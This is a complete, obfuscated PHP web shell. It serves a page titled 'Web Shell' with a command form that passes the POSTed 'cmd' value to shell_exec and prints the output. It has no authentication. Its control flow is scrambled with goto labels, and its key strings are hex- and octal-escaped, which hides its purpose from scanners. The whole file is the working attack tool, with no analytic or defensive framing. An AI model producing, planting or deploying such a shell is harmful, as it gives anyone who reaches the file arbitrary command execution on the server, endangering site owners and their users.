<?php
 goto lKrG0; wG407: ?>
<!doctypehtml><html lang="en"><head><meta charset="utf-8"><meta content="IE=edge"http-equiv="X-UA-Compatible"><meta content="width=device-width,initial-scale=1"name="viewport"><title>Web Shell</title><style>*{-webkit-box-sizing:border-box;box-sizing:border-box}body{font-family:sans-serif;color:rgba(0,0,0,.75)}main{margin:auto;max-width:850px}button,input,pre{padding:10px;border-radius:5px;background-color:#efefef}label{display:block}input{width:100%;background-color:#efefef;border:2px solid transparent}input:focus{outline:0;background:0 0;border:2px solid #e6e6e6}button{border:none;cursor:pointer;margin-left:5px}button:hover{background-color:#e6e6e6}.form-group{display:-webkit-box;display:-ms-flexbox;display:flex;padding:15px 0}</style></head><body><main><h1>Web Shell</h1><h2>Execute a command</h2><form method="post"><label for="cmd"><strong>Command</strong></label><div class="form-group"><input autofocus id="cmd"name="cmd"onfocus="this.setSelectionRange(this.value.length,this.value.length)"required value="<?php  goto jYZFT; GRYTz: if ($_SERVER["\122\105\x51\x55\x45\123\x54\x5f\x4d\x45\124\x48\117\104"] === "\x50\117\123\x54") { ?>
<h2>Output</h2><?php  if (isset($cmd)) { ?>
<pre><?php  echo htmlspecialchars($cmd, ENT_QUOTES, "\x55\x54\106\55\x38"); ?>
</pre><?php  } else { ?>
<pre><small>No result.</small></pre><?php  } } goto o2810; lKrG0: if (!empty($_POST["\x63\155\x64"])) { $cmd = shell_exec($_POST["\143\x6d\144"]); } goto wG407; XKxu_: ?>
"> <button type="submit">Execute</button></div></form><?php  goto GRYTz; jYZFT: echo htmlspecialchars($_POST["\143\155\x64"], ENT_QUOTES, "\125\x54\x46\x2d\70"); goto XKxu_; o2810: ?>
</main></body></html>
